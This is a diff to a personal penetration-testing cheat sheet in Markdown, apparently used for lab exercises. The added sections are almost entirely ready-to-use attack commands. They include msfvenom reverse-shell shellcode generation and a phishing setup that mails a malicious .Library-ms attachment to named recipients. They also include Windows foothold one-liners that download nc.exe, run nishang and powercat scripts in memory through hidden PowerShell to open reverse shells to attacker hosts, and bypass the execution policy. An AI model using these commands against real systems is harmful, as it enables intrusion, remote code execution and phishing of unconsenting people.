@@ -21,7 +21,11 @@
   - [SQLi](#sqli)
     - [MSSQL](#mssql)
   - [ExploitDB](#exploitdb)
+  - [shellcode](#shellcode)
 - [Phishing](#phishing)
+- [Foothold](#foothold)
+  - [Interactiveshell](#interactiveshell)
+  - [Windows](#windows-1)
   - [Tips](#tips)
 
 
@@ -61,6 +65,8 @@ nmap -n -Pn --script vuln 10.10.10.248
 # Recon
 ## Autorecon
 ```bash
+source /opt/autorecon/bin/activate
+autorecon <CIDR>
 ```
 
 ## SNMP
@@ -203,13 +209,52 @@ EXEC master..xp_fileexist '\\10.10.14.23\anything\'
 ```bash
 searchsploit -m 42031
 ```
+## shellcode
+https://shell-storm.org/shellcode/index.html
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f python 
+```
 
 # Phishing
+webdav
 ```bash
 # webdav
 wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /root/work/webdav
 # sendmail
 swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.232.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap  
+```
+shellter
+```bash
+shellter
+```
+
+# Foothold
+## Interactiveshell
+```bash
+# 仮想tty
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+stty raw -echo; fg 
+export TERM=xterm-256col
+export SHELL=/bin/bash
+reset
+```
+## Windows
+```powershell
+#nc.exe
+powershell -nop -c "iwr -Uri http://10.10.14.35/nc.exe -Outfile nc.exe"
+.\nc.exe 10.10.14.35 4444 -e powershell
+
+# Invoke-PowerShellTcp
+wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+powershell.exe -nop -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.37 -Port 4444"
+
+# powercat
+cd /usr/share/powershell-empire/empire/server/data/module_source/management/
+powershell.exe -nop -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.185/powercat.ps1');powercat -c 192.168.45.185 -p 4444 -e powershell"
+
+# Unrestricted
+powershell -ep bypass
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted
 ```
 
 ## Tips
